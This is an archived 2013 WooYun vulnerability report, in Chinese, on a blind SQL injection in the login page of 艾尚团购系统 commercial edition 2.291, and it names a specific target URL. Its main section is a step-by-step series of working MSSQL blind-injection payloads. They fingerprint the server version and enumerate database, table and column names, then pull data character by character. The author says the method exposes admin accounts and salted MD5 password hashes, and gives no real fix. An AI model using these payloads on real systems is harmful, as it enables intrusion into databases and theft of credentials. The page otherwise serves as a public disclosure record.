@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		艾尚团购系统商业版2.291 登录处盲注漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		艾尚团购系统商业版2.291 登录处盲注漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小痞子">小痞子</a> 
+</li><li>提交时间：		2013-03-07 09:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-07：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-04-21：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">http://test.asdht.com/login.aspx  这个页面登录的地方存在盲注</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><p class="detail"><a href="../images/062025111d6af5c9c74ff2ca6e930dec000935ff.jpg" target="_blank"><img src="../images/062025111d6af5c9c74ff2ca6e930dec000935ff.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/0620245922092c5eb7bd2b64884ef03032a951a7.jpg" target="_blank"><img src="../images/0620245922092c5eb7bd2b64884ef03032a951a7.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/06202449c4de83ed241e1f0ef60ddad897f2dd7a.jpg" target="_blank"><img src="../images/06202449c4de83ed241e1f0ef60ddad897f2dd7a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/06202523bd74f5236bd250283d6e1d8052482c5f.jpg" target="_blank"><img src="../images/06202523bd74f5236bd250283d6e1d8052482c5f.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+盲注常规步骤：<br />
+<br />
+<br />
+<br />
+判断库是否确实为MSSQL2005：<br />
+<br />
+&#039; and substring((select @@version),22,4)=&#039;2005&#039; ;--<br />
+<br />
+<br />
+<br />
+猜数据库名：<br />
+<br />
+<br />
+<br />
+先猜dbid：<br />
+<br />
+&#039; and (select count(*) from master.dbo.sysdatabases where dbid=5)=1 ;--<br />
+<br />
+根据dbid猜库名，先猜出长度：<br />
+<br />
+&#039; and (select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=12)=1 ;--<br />
+<br />
+再逐位猜：<br />
+<br />
+&#039; and (select count(*) from master.dbo.sysdatabases where dbid=5 and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+<br />
+<br />
+猜表名（假设库名已经猜出为database）：<br />
+<br />
+<br />
+<br />
+可以尝试先看有没管理表：<br />
+<br />
+&#039; and (select count(*) from database.dbo.sysobjects where xtype=&#039;u&#039; and name like &#039;%admin%&#039;)=1 ;--<br />
+<br />
+<br />
+<br />
+猜第一个，先长度：<br />
+<br />
+&#039; and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype=&#039;u&#039;) and len(name)=9)=1 ;--<br />
+<br />
+猜第一个表名，逐位猜：<br />
+<br />
+&#039; and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype=&#039;u&#039;) and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+猜第二个表名（假设第一个为table1）：<br />
+<br />
+&#039; and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype=&#039;u&#039; and name not in (&#039;table1&#039;)) and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+...<br />
+<br />
+<br />
+<br />
+猜字段（假设表名已经猜出为table）：<br />
+<br />
+<br />
+<br />
+猜第一个字段：<br />
+<br />
+&#039; and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id(&#039;database.dbo.table&#039;)) and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+猜第二个（假设第一个为column1）<br />
+<br />
+&#039; and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id(&#039;database.dbo.table&#039;) and name not in (&#039;column1&#039;)) and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+...<br />
+<br />
+<br />
+<br />
+猜数据（假设要猜的字段为name）：<br />
+<br />
+<br />
+<br />
+&#039; and (select count(*) from database.dbo.table where name in (select top 1 name from database_db.dbo.table) and ascii(substring(name,1,1))&gt;90)=1 ;--<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+通过此方法可以爆出后台账户 以及 MD5密码。 但是后台MD5加密都是跟了后缀 比较难解密 FormsAuthentication.HashPasswordForStoringInConfigFile(pwd + &quot;@4!@#$%@&quot;, &quot;md5&quot;)) </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/06202523bd74f5236bd250283d6e1d8052482c5f.jpg" target="_blank"><img src="../images/06202523bd74f5236bd250283d6e1d8052482c5f.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你懂的 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小痞子" title="小痞子">小痞子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019645" title="艾尚团购系统商业版2.291 登录处盲注漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19645";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
